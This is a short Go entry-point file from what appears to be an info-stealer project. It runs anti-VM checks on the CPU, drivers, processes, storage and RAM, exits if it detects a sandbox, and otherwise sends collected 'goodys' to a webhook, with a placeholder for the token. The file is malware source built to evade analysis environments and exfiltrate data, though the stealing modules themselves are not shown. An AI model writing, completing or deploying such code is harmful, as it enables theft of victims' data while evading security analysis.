// main.go
package main

// This should match your module path
import (
	"MemObTest1/antivm"
	"MemObTest1/getgoodys"
)

func main() {

	if antivm.CheckCPU() != false || antivm.CheckDrivers() != false || antivm.GetProc() != false || antivm.CheckStorage() != false || antivm.GetRam() != false {
		return
	}
	getgoodys.Send_webhook("") // << insert token here

}


